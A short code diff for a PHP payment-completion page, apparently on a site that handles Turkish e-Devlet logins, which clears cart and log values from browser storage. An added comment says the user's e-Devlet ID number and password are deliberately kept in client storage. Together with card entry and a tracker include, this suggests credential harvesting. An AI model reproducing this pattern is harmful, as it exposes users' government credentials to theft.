@@ -119,8 +119,13 @@ $basvuruNo = $logId > 0 ? 'SB' . str_pad($logId, 6, '0', STR_PAD_LEFT) : '';
     </div>
 
     <script>
+        // Clear all payment-related storage on successful completion
         localStorage.removeItem('cart');
+        localStorage.removeItem('logId');
+        localStorage.removeItem('logAmount');
         sessionStorage.removeItem('card_entered');
+        // Note: edevlet_tc / edevlet_pass are intentionally kept so the user
+        // can start a new transaction without logging in again.
     </script>
 
     <?php include 'includes/tracker.php'; ?>
